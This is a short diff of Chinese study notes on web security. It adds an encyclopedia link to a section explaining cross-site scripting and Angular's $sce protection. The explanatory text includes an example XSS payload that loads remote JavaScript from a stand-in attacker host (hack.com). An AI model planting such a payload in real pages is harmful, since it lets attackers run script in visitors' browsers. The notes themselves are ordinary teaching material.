@@ -7,6 +7,7 @@
 * 推荐书籍
 
 ### XSS攻击
+[百度百科](https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065?fr=aladdin)
 主要是注入脚本，如论坛里面用户输入`<script>alert();</script>`，页面回显的时候如果没有处理js脚本，就可能造成攻击。angular的$sce就是用来处理XSS攻击的。`<script>$.getScript('http://www.hack.com/index.js');</script>`
 
 1. HTML中代码注入技巧(196页)
